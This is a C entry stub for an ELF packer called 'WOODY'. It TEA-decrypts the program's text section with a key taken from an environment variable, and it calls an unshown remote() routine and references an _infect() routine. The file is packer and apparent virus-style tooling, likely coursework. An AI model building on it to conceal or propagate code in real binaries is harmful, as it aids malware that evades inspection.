int main(int ac, char **av) asm ("entry");

#include "lib/lib.h"
#include "lib/remote.h"
//#include "lib/infect.c"

//extern size_t memaddr;
extern void _infect();
extern size_t size;

//======================= WOODY ==============================

extern size_t text_start;
extern size_t text_length;

extern char test_area;

extern char   key[16];

#include <elf.h>

void decrypt_block(uint32_t* v, uint32_t *k) {
	uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* initialisation */
	uint32_t delta=0x9e3779b9;                     /* constantes de clefs */
	uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* mise en cache de la clef */
	for (i=0; i<32; i++) {                         /* boucle principale */
		v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
		v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
		sum -= delta;
	}
	v[0]=v0; v[1]=v1;
}

void decrypt(char *s, uint64_t n, uint32_t *k){
	for (uint64_t i = 0; i < n; i += 8){
		if (i + 7 <= n){
			decrypt_block((uint32_t*)(s+i), k);
		}
	}
}

void cant_decrypt(){
	println("invalid key!");
	exit(-1);
}

void decrypt_with_key(){
	char *user_key = getenv("KEY");
	if (user_key != NULL){
		for (int i = 0; i < 16 && user_key[i]; i++)
			key[i] = user_key[i];
	}
	decrypt((void*)text_start, text_length, (uint32_t*)key);
	decrypt(&test_area, 8, (uint32_t*)key);
	//check test_start is full of '0'
	for (int i = 0; i < 8; i++){
		if ((&test_area)[i] != 'A')
			cant_decrypt();
	}
}

//=============================================================

void printargs(int ac, char **av){
	print("args: [");
	for (int i =0 ; i < ac; i++){
		print("\"");
		print(av[i]);
		print("\"");
		if (i+1 == ac) print("]\n");
		else print(", ");
	}
}

int main(int ac, char **av){
	remote();
	println("....WOODY....");
	decrypt_with_key();
}
